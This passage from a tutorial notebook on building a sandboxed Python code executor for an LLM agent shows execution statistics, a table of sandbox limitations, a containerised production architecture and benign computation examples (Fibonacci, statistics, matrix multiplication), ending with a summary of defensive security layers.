print("=" * 50)
print("CODE EXECUTOR LIFETIME STATISTICS")
print("=" * 50)
for k, v in stats.items():
    print(f"  {k}: {v}")

# Analyze error types
error_types = defaultdict(int)
for entry in executor.history:
    if not entry["result"]["success"]:
        error = entry["result"].get("error", "unknown")
        error_type = error.split(":")[0] if ":" in error else error[:30]
        error_types[error_type] += 1

if error_types:
    print("\nError breakdown:")
    for err_type, count in sorted(error_types.items(), key=lambda x: -x[1]):
        print(f"  {err_type}: {count}")

# Execution time distribution
times = [h["result"].get("execution_time", 0) for h in executor.history if h["result"]["success"]]
if times:
    print(f"\nExecution times (successful runs):")
    print(f"  Min: {min(times):.4f}s")
    print(f"  Max: {max(times):.4f}s")
    print(f"  Mean: {statistics.mean(times):.4f}s")
    if len(times) > 1:
        print(f"  Stdev: {statistics.stdev(times):.4f}s")

## 11. Limitations and Production Considerations

### What Our Sandbox Cannot Do

| Limitation | Why | Mitigation |
|-----------|-----|------------|
| **No file I/O** | Security risk | Pass data via function arguments |
| **No networking** | Data exfiltration risk | Use separate API tools for network access |
| **No pip install** | Supply chain attacks | Pre-install needed packages |
| **Thread-based timeout** | Thread can't be truly killed in CPython | Use subprocess with hard kill in production |
| **No memory limit** | StringIO can grow unbounded | Use resource limits (Unix) or container limits |
| **Shared process space** | Sandbox shares memory with host | Use Docker/gVisor in production |

### Production Architecture

```
┌─────────────────────────────────────────────────┐
│                PRODUCTION SETUP                  │
├─────────────────────────────────────────────────┤
│                                                  │
│  Agent (Main Process)                            │
│    │                                             │
│    │  code string                                │
│    ▼                                             │
│  ┌──────────────────────┐                        │
│  │ Static Analysis      │── blocked ──► error    │
│  └──────────┬───────────┘                        │
│             │ passed                             │
│             ▼                                    │
│  ┌──────────────────────┐                        │
│  │ Docker Container     │  ← separate process    │
│  │  - seccomp profile   │  ← syscall filter      │
│  │  - memory limit      │  ← cgroup limit        │
│  │  - CPU limit         │  ← cgroup limit        │
│  │  - no network        │  ← network namespace   │
│  │  - read-only FS      │  ← mount option        │
│  │  - timeout           │  ← hard kill           │
│  └──────────┬───────────┘                        │
│             │ result                             │
│             ▼                                    │
│  Agent receives structured result                │
└─────────────────────────────────────────────────┘
```

### Key Production Recommendations

1. **Always use subprocess isolation** — `threading.Thread` timeouts are cooperative, not enforced
2. **Use containers** (Docker, Firecracker, gVisor) for true sandboxing
3. **Set resource limits** — memory (e.g., 256MB), CPU time (e.g., 10s), output size
4. **Log everything** — every code execution should be auditable
5. **Rate limit** — prevent DoS through rapid code execution requests
6. **Content filtering** — scan output for sensitive data before returning to agent

### 11.1 — Demonstrating Safe Patterns

Even within our restrictions, the sandbox supports rich computation patterns.

In [ ]:
# Show what IS possible within the sandbox
advanced_examples = [
    ("Recursive Fibonacci with memoization", """
from functools import lru_cache

@lru_cache(maxsize=None)
def fib(n):
    if n < 2:
        return n
    return fib(n-1) + fib(n-2)

for i in range(0, 31, 5):
    print(f"fib({i}) = {fib(i)}")
"""),
    ("Statistical analysis with collections", """
from collections import Counter
import statistics

data = [23, 45, 12, 67, 34, 89, 23, 45, 56, 78, 23, 45, 12, 90, 34]
counter = Counter(data)
print(f"Data: {data}")
print(f"Most common: {counter.most_common(3)}")
print(f"Mean: {statistics.mean(data):.1f}")
print(f"Median: {statistics.median(data)}")
print(f"Stdev: {statistics.stdev(data):.1f}")
print(f"Quartiles: Q1={statistics.quantiles(data)[0]}, Q3={statistics.quantiles(data)[2]}")
"""),
    ("Matrix operations (no numpy needed)", """
def mat_mul(A, B):
    rows_a, cols_a = len(A), len(A[0])
    rows_b, cols_b = len(B), len(B[0])
    result = [[0]*cols_b for _ in range(rows_a)]
    for i in range(rows_a):
        for j in range(cols_b):
            for k in range(cols_a):
                result[i][j] += A[i][k] * B[k][j]
    return result

A = [[1, 2], [3, 4]]
B = [[5, 6], [7, 8]]
C = mat_mul(A, B)
print(f"A = {A}")
print(f"B = {B}")
print(f"A × B = {C}")
"""),
]

print("=" * 60)
print("ADVANCED SANDBOX CAPABILITIES")
print("=" * 60)

for name, code_str in advanced_examples:
    print(f"\n--- {name} ---")
    result = executor.execute(code_str)
    if result["success"]:
        print(result["stdout"])
    else:
        print(f"  Error: {result['error']}")

## 12. Summary & Key Takeaways

### What We Built

| Component | Purpose |
|-----------|---------|
| **Sandbox** | Restricted Python environment with static analysis, import whitelist, timeout |
| **CodeExecutor** | Tool wrapper with execute, validate, format_result, and history tracking |
| **CodeAgent** | ReAct-style agent that writes code, runs it, and iterates on errors |

### Security Layers

```
Layer 1: Static Analysis    → Block dangerous patterns before execution
Layer 2: AST Import Check   → Only allow whitelisted modules
Layer 3: Restricted Builtins → Remove __import__, exec, eval, open, compile
Layer 4: Safe Import Hook    → Runtime import filtering
Layer 5: Timeout             → Kill long-running code
Layer 6: Output Capture      → Isolate stdout/stderr
```

### When to Use Code Execution

| ✅ Use Code Execution | ❌ Use Fixed Tools Instead |
|---|---|
| Complex computation | Simple lookups |
| Data transformation | Standard API calls |
| Algorithm implementation | File operations (use dedicated tool) |
| Statistical analysis | Network requests (use HTTP tool) |
| String processing | Database queries (use DB tool) |

### Key Lessons

1. **Defense in depth** — no single security layer is sufficient. Stack them.
2. **Static analysis before execution** — catch problems before they run.
3. **Helpful error messages** — the agent needs to understand failures to fix them.
4. **Iterative refinement** — plan for the agent to need 2-3 attempts on hard problems.
5. **Know the limits** — thread-based timeout is imperfect; production needs containers.

### What's Next

In **Notebook 15**, we'll explore **multi-agent systems** — multiple specialized agents collaborating on complex tasks, each with their own tool sets and capabilities.

---

*"The ability to write and execute code transforms an LLM from a knowledge system into a problem-solving system."*